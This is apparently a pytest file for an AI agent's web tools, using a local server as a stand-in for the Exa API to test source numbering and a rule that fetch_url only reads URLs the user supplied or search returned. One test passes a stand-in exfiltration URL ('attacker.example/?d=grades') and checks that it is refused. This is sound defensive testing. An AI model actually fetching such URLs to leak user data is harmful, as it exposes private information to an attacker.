"""The web tools' rules, against a local server standing in for Exa: numbering and the URL rule."""
import json
import threading
from http.server import BaseHTTPRequestHandler
from socketserver import ThreadingTCPServer

import pytest

from agent import Toolbox
from agent import web

SAVED = [{"type": "source-url", "sourceId": "1", "url": "https://a.example", "title": "A"},
         {"type": "source-url", "sourceId": "3", "url": "https://b.example", "title": "B"}]  # 2 was never sent


@pytest.fixture(autouse=True)
def exa(monkeypatch, request):
    """Answers /search with pages B and C, and /contents with whatever pages were asked for."""
    class Answer(BaseHTTPRequestHandler):
        def do_POST(self):
            body = json.loads(self.rfile.read(int(self.headers["Content-Length"])))
            if self.path == "/search":
                results = [{"id": url, "url": url, "title": url[8], "highlights": [f"about {url[8]}"]}
                           for url in ("https://b.example", "https://c.example")]
            else:
                results = [{"id": url, "url": url, "title": "Page", "text": "page text"} for url in body["urls"]]
            data = json.dumps({"results": results}).encode()
            self.send_response(200)
            self.send_header("Content-Length", str(len(data)))
            self.end_headers()
            self.wfile.write(data)

    server = ThreadingTCPServer(("127.0.0.1", 0), Answer)
    threading.Thread(target=server.serve_forever, kwargs={"poll_interval": 0.01}, daemon=True).start()
    request.addfinalizer(server.server_close)
    request.addfinalizer(server.shutdown)
    monkeypatch.setattr(web, "EXA_API", f"http://127.0.0.1:{server.server_address[1]}")
    monkeypatch.setenv("EXA_API_KEY", "test")


async def test_sources_keep_their_numbers_and_new_ones_count_on():
    box = Toolbox("c", sources=SAVED)
    result = await box.run("web_search", {"query": "q", "objective": "o"})
    await box.aclose()
    assert result.text().startswith("[3] Title: b\nURL: https://b.example\n")
    assert [(part["sourceId"], part["url"]) for part in result.sources] == [
        ("3", "https://b.example"), ("4", "https://c.example")]


async def test_fetch_url_reads_only_urls_the_user_wrote_or_exa_returned():
    box = Toolbox("c", urls=["https://user.example/notes"])
    made_up = await box.run("fetch_url", {"urls": ["https://attacker.example/?d=grades"]})
    assert made_up.error and "Not seen: https://attacker.example/?d=grades" in made_up.text()
    assert not (await box.run("fetch_url", {"urls": ["https://user.example/notes"]})).error
    await box.run("web_search", {"query": "q", "objective": "o"})
    assert not (await box.run("fetch_url", {"urls": ["https://c.example"]})).error
    await box.aclose()
